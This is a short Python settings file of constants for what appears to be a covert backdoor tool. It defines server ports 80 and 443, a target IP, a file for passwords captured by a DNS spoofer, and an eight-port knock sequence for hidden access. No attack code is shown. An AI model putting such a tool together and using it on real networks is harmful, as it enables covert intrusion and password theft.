PORT = 80  # The same port as used by the server
INOTIFY_PORT = 443  # The same port as used by the server

DESTINATION = "192.168.0.25" #IP address of the server(venoms)
EOF = "G"#used for downloading. this has to be the same with client
DNSPOOF_PASSWORD_FILE = "saved_passwords.txt"#file name to save passwords arrived from dns spoofer
PORT_KNOCK_ARRAY = [8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000] #this variable has to be length of 8 and has to be same with the server